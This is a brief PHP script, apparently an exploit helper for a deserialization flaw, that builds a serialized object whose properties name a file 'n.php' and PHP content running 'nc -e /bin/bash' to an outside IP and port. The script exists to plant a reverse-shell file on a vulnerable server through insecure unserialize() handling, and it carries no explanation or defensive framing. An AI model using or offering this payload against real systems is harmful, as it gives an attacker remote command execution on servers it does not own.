<?php

class file
{
	public $file = 'n.php';
	public $data = '<?php shell_exec("nc -e /bin/bash 10.8.107.21 1234"); ?>';
}

echo (serialize(new file));

?>